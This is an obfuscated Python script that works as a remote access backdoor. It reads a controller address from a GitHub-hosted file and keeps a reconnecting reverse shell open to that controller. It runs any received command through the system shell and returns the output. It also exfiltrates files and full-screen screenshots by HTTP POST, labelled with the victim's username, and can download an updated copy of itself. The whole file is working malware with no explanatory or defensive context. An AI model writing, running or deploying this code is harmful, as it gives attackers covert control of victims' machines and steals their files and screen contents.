import subprocess,socket,time,requests,os
from PIL import ImageGrab
PqKjvrSeebSOBhgDv = "05.12.24.1"
DNzUWiGHRTdrs = ""
grlYPZrD = ""
RuEhSuQ = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
UKVQgOsvpGPsosPTPjG = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
kgsLloxIIqjHVLac = "!"
def aCuoPYMNWyj(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def SjnYpwxHm(s):
	JirSmpFkaDq = s.recv(1024)
	if len(JirSmpFkaDq)==0:
		return True
	fqKRrdif = JirSmpFkaDq.decode("utf-8").replace("\n","")
	if not fqKRrdif.startswith(kgsLloxIIqjHVLac):
		proc = subprocess.run(fqKRrdif, shell=True, capture_output=True)
		dveQcXeypviA = proc.stdout + proc.stderr
		s.send(dveQcXeypviA)
		return
	ibXvdTWWBE = fqKRrdif.split(" ")[0][1:]
	if ibXvdTWWBE == "download":
		rdHfImbtBRNVHgdT(s, fqKRrdif)
	elif ibXvdTWWBE == "screenshot":
		JJgtihahd(s)
	elif ibXvdTWWBE == "basename":
		s.send(bytes(os.path.basename(__file__), "utf-8"))
def rdHfImbtBRNVHgdT(s, fqKRrdif):
	IisqiCZtJDW = fqKRrdif.replace(kgsLloxIIqjHVLac+"download ","").split(",")
	dveQcXeypviAs = ""
	for f in IisqiCZtJDW:
		dveQcXeypviAs += MwmUasjsPvFnUqIpArkHkk(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(dveQcXeypviAs, "utf-8"))
def JJgtihahd(s):
	kXFprpLt = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	jUPyFJddQfthEbnhik = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	kXFprpLt.save(jUPyFJddQfthEbnhik)
	kXFprpLt.close()
	r = MwmUasjsPvFnUqIpArkHkk(jUPyFJddQfthEbnhik, "api/sscap")
	os.remove(jUPyFJddQfthEbnhik)
	s.send(bytes(r,"utf-8"))
def MwmUasjsPvFnUqIpArkHkk(NIFPQTZTYfZuhyHXiVEbe, lVqLbQUReDkqLvDMrSS, CjphQLk=None):
	if not os.path.exists(NIFPQTZTYfZuhyHXiVEbe):
		return "[!] NOT FOUND: "+NIFPQTZTYfZuhyHXiVEbe+"\n"
	headers = {"user":os.getlogin()}
	if CjphQLk is not None:
		headers = {**headers, **CjphQLk}
	requests.post("http://"+DNzUWiGHRTdrs+":5555/"+lVqLbQUReDkqLvDMrSS,
		files={"file":open(NIFPQTZTYfZuhyHXiVEbe, "rb")},
		headers=headers)
	return "[+] SUCCESS: "+NIFPQTZTYfZuhyHXiVEbe+"\n"
def cMrZoQTggNz():
	global DNzUWiGHRTdrs, grlYPZrD
	if DNzUWiGHRTdrs == "" or grlYPZrD == "":
		JirSmpFkaDq = requests.get(RuEhSuQ).text.replace("\n","").split(":")
		DNzUWiGHRTdrs = JirSmpFkaDq[0].strip()
		grlYPZrD = JirSmpFkaDq[1].strip()
		quaXDCOxEcaUG = JirSmpFkaDq[2].strip()
	return DNzUWiGHRTdrs, grlYPZrD, quaXDCOxEcaUG
def cISyJvBkQfrPgrn():
	PJJybYAV = os.path.basename(__file__)
	fileType = PJJybYAV.split(".")[-1]
	kBSEpwshETOtcv = PJJybYAV.replace("."+fileType,"") +"."+PqKjvrSeebSOBhgDv + "."+fileType
	GIbRNfAHKJglJiVMuftsWD = os.path.join(os.getcwd(), kBSEpwshETOtcv)
	with open(kBSEpwshETOtcv, "w+") as f:
		f.write(requests.get(UKVQgOsvpGPsosPTPjG+"file."+GIbRNfAHKJglJiVMuftsWD.split(".")[-1]).text)
	#if fileType == "exe":
	#	os.system(".\"+GIbRNfAHKJglJiVMuftsWD")
	#elif fileType.startswith("py"):
	#	os.system("python "+GIbRNfAHKJglJiVMuftsWD)
def mskkGgOJP():
	pass
def VqECsGZJYVfBIVzd():
	h, p, v = cMrZoQTggNz()
	if PqKjvrSeebSOBhgDv != v:
		cISyJvBkQfrPgrn()
	mskkGgOJP()
	kLyWvlcMotBntUczlLjSPX = bytes("["+PqKjvrSeebSOBhgDv+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				gcKxbZloKUIQEZEWSi=False
				try:
					s=aCuoPYMNWyj(h, p)
					while not gcKxbZloKUIQEZEWSi:
						s.send(kLyWvlcMotBntUczlLjSPX)
						gcKxbZloKUIQEZEWSi=SjnYpwxHm(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
VqECsGZJYVfBIVzd()
